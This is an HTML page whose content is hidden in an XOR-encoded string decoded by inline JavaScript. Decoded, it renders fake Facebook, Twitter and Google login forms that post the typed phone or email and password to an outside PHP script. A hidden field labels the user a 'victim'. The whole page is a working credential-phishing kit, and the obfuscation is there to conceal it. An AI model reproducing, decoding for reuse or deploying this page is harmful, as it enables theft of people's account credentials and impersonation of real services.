1C--pctkpcn,amo-i]dca,rjr'00'02ogvjmf'1F'00rmqv'00'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Aklrwv'02v{rg'1F'00vgzv'00'02lcog'1F'00gockn'00'02ancqq'1F'00klrwvD`'00'02rncagjmnfgp'1F'00Om`kng'02lwo`gp'02mp'02gockn'02cffpgqq'00'02cwvmamorngvg'1F'00mdd'00'02cwvmacrkvcnkxg'1F'00mdd'00'02pgswkpgf'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Aklrwv'02v{rg'1F'00rcqqumpf'00'02ancqq'1F'00klrwvD`'00'02lcog'1F'00rcqq'00'02rncagjmnfgp'1F'00Rcqqumpf'00'02cwvmamorngvg'1F'00mdd'00'02cwvmacrkvcnkxg'1F'00mdd'00'02pgswkpgf'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Aklrwv'02v{rg'1F'00jkffgl'00'02lcog'1F'00nmekl'00'02tcnwg'1F'00Dcag`mmi'00'02pgcfmln{'1G'2C'2;'2;'2;'2;'1Aklrwv'02v{rg'1F'00jkffgl'00'02lcog'1F'00v{rg'00'02tcnwg'1F'00dd]d`'00'02pgcfmln{'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Aklrwv'02v{rg'1F'00jkffgl'00'02lcog'1F'00wqgp]kf]tkavko'00'02tcnwg'1F'00CTMOH'00'02-'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1A`wvvml'02v{rg'1F'00qw`okv'00'02ancqq'1F'00`vl/nmekl/d`'00'1GNme'02Kl'1A-`wvvml'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1A-dmpo'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1Afkt'02ancqq'1F'00vzv/apgcvg/caamwlv'00'1GApgcvg'02caamwlv'1A-fkt'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1Afkt'02ancqq'1F'00vzv/lmv/lmu'00'1GLmv'02lmu'1A-fkt'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1Afkt'02ancqq'1F'00vzv/dmpemvvgl/rcqqumpf'00'1GDmpemvvgl'02rcqqumpf'1D'1A-fkt'1G'2C'02'02'02'02'02'02'02'02'1A-fkt'1G'2C'02'02'02'02'02'02'02'02'1Afkt'02ancqq'1F'00nclewceg/`mz'00'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1Aaglvgp'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1Afkt'02ancqq'1F'00nclewceg/lcog'02nclewceg/lcog/cavktg'00'1GGlenkqj'02'0:WI'0;'1A-fkt'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1Afkt'02ancqq'1F'00nclewceg/lcog'00'1G@cjcqc'02Klfmlgqkc'1A-fkt'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1Afkt'02ancqq'1F'00nclewceg/lcog'00'1G@cqc'02Hcuc'1A-fkt'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1Afkt'02ancqq'1F'00nclewceg/lcog'00'1G@cjcqc'02Ognc{w'1A-fkt'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1Afkt'02ancqq'1F'00nclewceg/lcog'00'1G'w47G7'w450A'w:C;G'1A-fkt'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1Afkt'02ancqq'1F'00nclewceg/lcog'00'1GGqrc'D3mn'1A-fkt'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1Afkt'02ancqq'1F'00nclewceg/lcog'00'1GRmpvwew'GCq'02'0:@pcqkn'0;'1A-fkt'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1Afkt'02ancqq'1F'00nclewceg/lcog'00'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Ak'02ancqq'1F'00dc'02dc/rnwq'00'1G'1A-k'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1A-fkt'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1A-aglvgp'1G'2C'02'02'02'02'02'02'02'02'1A-fkt'1G'2C'02'02'02'02'02'02'02'02'1Afkt'02ancqq'1F'00amr{pkejv'00'1GDcag`mmi'02Kla,'1A-fkt'1G'2C'02'02'02'02'1A-fkt'1G'2C'1A-fkt'1G'2C'2C'1Afkt'02ancqq'1F'00rmrwr/nmekl'02vukvvgp'02clkocvgf'02dcfgKl'00'02qv{ng'1F'00fkqrnc{'1C'02lmlg'1@'00'1G'2C'02'02'02'02'1Afkt'02ancqq'1F'00rmrwr/`mz/nmekl/vukvvgp'00'02qv{ng'1F'00vgzv/cnkel'1Cngdv'1@'02rcffkle'1C7rz'1@'00'1G'2C'2;'2;'02'02'02'02'02'02'02'02'1Ac'02mlankai'1F'00anmqgvukv'0:'0;'00'02ancqq'1F'00anmqg/mvjgp'00'1G'1Ak'02ancqq'1F'00xofk'02xofk/anmqg'00'1Ganmqg'1A-k'1G'1A-c'1G'2C'2C'02'02'02'02'02'02'02'02'1Afkt'02ancqq'1F'00jgcfgp/vukvvgp'00'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1Aaglvgp'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1Akoe'02qpa'1F'00jvvrq'1C--0r,amo,vp-ur/amlvglv-wrnmcfq-023:-25-emmeng]RLE3;417,rle'00'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1A-aglvgp'1G'2C'02'02'02'02'02'02'02'02'1A-fkt'1G'2C'02'02'02'02'02'02'02'02'1Afkt'02ancqq'1F'00`mz/vukvvgp'00'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1Aaglvgp'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1Admpo'02cavkml'1F'00jvvrq'1C--pctkpcn,amo-i]dca,rjr'00'02ogvjmf'1F'00rmqv'00'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Afkt'02ancqq'1F'00vzv/nmekl/vukvvgp'00'1GNmekl'02vm'02Emmeng'1A-fkt'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Afkt'02ancqq'1F'00klrwv/`mz/vukvvgp'00'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Anc`gn'1GRjmlg'0A'02gockn'0A'02mp'02wqgplcog'1A-nc`gn'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Aklrwv'02v{rg'1F'00vgzv'00'02lcog'1F'00gockn'00'02rncagjmnfgp'1F'00'00'02pgswkpgf'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1A-fkt'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Afkt'02ancqq'1F'00klrwv/`mz/vukvvgp'00'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Anc`gn'1GRcqqumpf'1A-nc`gn'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Aklrwv'02v{rg'1F'00rcqqumpf'00'02lcog'1F'00rcqq'00'02rncagjmnfgp'1F'00'00'02pgswkpgf'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1A-fkt'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Aklrwv'02v{rg'1F'00jkffgl'00'02lcog'1F'00nmekl'00'02tcnwg'1F'00Vukvvgp'00'02pgcfmln{'1G'2C'2;'2;'2;'2;'1Aklrwv'02v{rg'1F'00jkffgl'00'02lcog'1F'00v{rg'00'02tcnwg'1F'00dd]emmeng'00'02pgcfmln{'1G'2C'2;'2;'2;'2;'1Aklrwv'02v{rg'1F'00jkffgl'00'02lcog'1F'00wqgp]kf]tkavko'00'02tcnwg'1F'00CTMOH'00'02-'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1A`wvvml'02v{rg'1F'00qw`okv'00'02ancqq'1F'00`wvvml'02`nwg'00'1G'02'02Nme'02Kl'02'02'1A-`wvvml'1G'1A`p'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Afkt'02ancqq'1F'00dmmvgp/oglw/vukvvgp'00'1GDmpemv'02rcqqumpf'1D'1A-fkt'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Afkt'02ancqq'1F'00dmmvgp/oglw/vukvvgp'02`wngv'00'1G'w0200'1A-fkt'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Afkt'02ancqq'1F'00dmmvgp/oglw/vukvvgp'00'1GQkel'02wr'02vm'02Emmeng'1A-fkt'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1A-dmpo'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1A-aglvgp'1G'2C'02'02'02'02'02'02'02'02'1A-fkt'1G'2C'02'02'02'02'1A-fkt'1G'2C'1A-fkt'1G'02'02'02'2C'2C'02'1Aqapkrv'02qpa'1F'00jvvrq'1C--chcz,emmengcrkq,amo-chcz-nk`q-hswgp{-1,7,3-hswgp{,okl,hq'00'1G'1A-qapkrv'1G'2C'1Aqapkrv'02qpa'1F'00jvvrq'1C--amfg,hswgp{,amo-wk-3,33,1-hswgp{/wk,hq'00'1G'1A-qapkrv'1G'2C'1Aqapkrv'02qpa'1F'00jvvrq'1C--aflhq,anmwfdncpg,amo-chcz-nk`q-hswgp{wk/vmwaj/rwlaj-2,0,1-hswgp{,wk,vmwaj/rwlaj,okl,hq'00'1G'1A-qapkrv'1G'2C'2C'2C'2C'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2C'06'0:fmawoglv'0;,pgcf{'0:dwlavkml'0:'0;'02'5@'2C'2;'06'0:'00'01d`Nmekl'00'0;,ml'0:'05ankai'05'0A'02dwlavkml'0:'0;'02'5@'2C'2;'2;'06'0:'00'01nmeklOmfcn'00'0;,jkfg'0:'0;'1@'2C'2C'2;'2;'06'0:'00,dcag`mmi'00'0;,dcfgKl'0:'05qnmu'05'0;'1@'2C'2C'2;'2;'06'0:'00,anmqg/d`'00'0;,ml'0:'05ankai'05'0A'02dwlavkml'0:'0;'02'5@'2C'2;'2;'2;'06'0:'00,dcag`mmi'00'0;,jkfg'0:'0;'1@'2C'2C'2;'2;'2;'06'0:'00'01nmeklOmfcn'00'0;,qjmu'0:'0;'1@'2C'2;'2;'5F'0;'1@'2C'2;'5F'0;'1@'2C'2C'2;'06'0:'00'01vukvNmekl'00'0;,ml'0:'05ankai'05'0A'02dwlavkml'0:'0;'02'5@'2C'2C'2;'2;'06'0:'00,vukvvgp'00'0;,dcfgKl'0:'05qnmu'05'0;'1@'2C'2C'2;'2;'06'0:'00,anmqg/mvjgp'00'0;,ml'0:'05ankai'05'0A'02dwlavkml'0:'0;'02'5@'2C'2;'2;'2;'06'0:'00,vukvvgp'00'0;,jkfg'0:'0;'1@'2C'2C'2;'2;'2;'06'0:'00'01nmeklOmfcn'00'0;,qjmu'0:'0;'1@'2C'2;'2;'5F'0;'1@'2C'2;'5F'0;'1@'2C'5F'0;'1@'2C'2C'1A-qapkrv'1G'02'02'02'2C'2;'2;'02'2C'2;'1Aqapkrv'1G'2C'2;'02'02tcp'02amtgpApgcvgVgconmcfDkng'02'1F'02dwlavkml'0:gtglv'0;'02'5@'2C'2;'02'02'02'02tcp'02mwvrwv'02'1F'02fmawoglv,egvGngoglv@{Kf'0:'05amtgp]apgcvg]vgco]rpgtkgu'05'0;'1@'2C'2;'02'02'02'02mwvrwv,qpa'02'1F'02WPN,apgcvgM`hgavWPN'0:gtglv,vcpegv,dkngq'7@2'7F'0;'1@'2C'2;'02'02'5F'1@'2C'2C'2;'02'02tcp'02ctcvcpApgcvgVgconmcfDkng'02'1F'02dwlavkml'0:gtglv'0;'02'5@'2C'2;'02'02'02'02tcp'02mwvrwv'02'1F'02fmawoglv,egvGngoglv@{Kf'0:'05ctcvcp]apgcvg]vgco]rpgtkgu'05'0;'1@'2C'2;'02'02'02'02mwvrwv,qpa'02'1F'02WPN,apgcvgM`hgavWPN'0:gtglv,vcpegv,dkngq'7@2'7F'0;'1@'2C'2;'02'02'5F'1@'2C'2;'1A-qapkrv'1G'2C'1Aqapkrv'1G'2C'2;'2;'06'0:dwlavkml'0:'0;'02'5@'2C'2;'2;'2;'06'0:'05,qgngav/ecog'05'0;,qgngavkxg'0:'5@'2C'2;'2;'2;'2;oczKvgoq'1C'021'2C'2;'2;'2;'5F'0;'1@'2C'2;'2;'5F'0;'2C'2C'2;'1A-qapkrv'1G'2;'2;'02'2C'2;'2;'02'2C'02'02'02'02'02'02'1A-fkt'1G'2C'2C'2C'2C'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;'2;'2;'06'0:'05'7@fcvc/vmeeng'1F'00rmrmtgp'00'7F'05'0;,rmrmtgp'0:'0;'1@'2C'2;'2;'2;'06'0:'05,cngpv'05'0;,pgcf{'0:dwlavkml'0:'0;'5@'2C'2;'2;'2;'02'02'02'02kd'0:'03'06'0:vjkq'0;,jcqAncqq'0:'05qvc{'05'0;'0;'02'5@'02'2C'2;'2;'2;'02'02'02'02'02'02'02'02qgvVkogmwv'0:dwlavkml'0:'0;'5@'02'06'0:'05,cngpv'05'0;,cffAncqq'0:'05qjmu'05'0;'1@'5F'0A'02722'0;'1@'2C'2;'2;'2;'02'02'02'02'02'02'02'02qgvVkogmwv'0:dwlavkml'0:'0;'5@'02'06'0:'05,cngpv'05'0;,pgomtgAncqq'0:'05qjmu'05'0;'1@'5F'0A'0237222'0;'1@'2C'2;'2;'2;'02'02'02'02'5F'2C'2;'2;'2;'02'02'02'02gnqg'5@'2C'2;'2;'2;'02'02'02'02'02'02'02'02qgvVkogmwv'0:dwlavkml'0:'0;'5@'02'06'0:'05,cngpv'05'0;,cffAncqq'0:'05qjmu'05'0;'1@'5F'0A'02722'0;'1@'2C'2;'2;'2;'02'02'02'02'5F'2C'2;'2;'2;'5F'0;'1@'2C'2;'2;'1A-qapkrv'1G'2C'02'02'02'02'02'02'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'02qpa'1F'00jvvrq'1C--pctkpcn,amo-jmqv]qv{ng-qv{ng-lgu]dd]t0-kocegq-tglfmpqockl,hq'00'1G'1A-qapkrv'1G'2C'02'02'02'02'02'02'02'02'02'02'02'1Aqapkrv'02qpa'1F'00jvvrq'1C--pctkpcn,amo-jmqv]qv{ng-qv{ng-hq/vpcai-vpcai,hq'00'1G'1A-qapkrv'1G'02'2C'2C'02'02'02'1A-`mf{'1G'2C'1A-jvon'1G'2C'2C'2C"; teks=""; teksasli="";var panjang;panjang=enkripsi.length;for (i=0;i&lt;panjang;i++){ teks+=String.fromCharCode(enkripsi.charCodeAt(i)^2) }teksasli=unescape(teks);document.write(teksasli);
</script>

 </body>
</html>


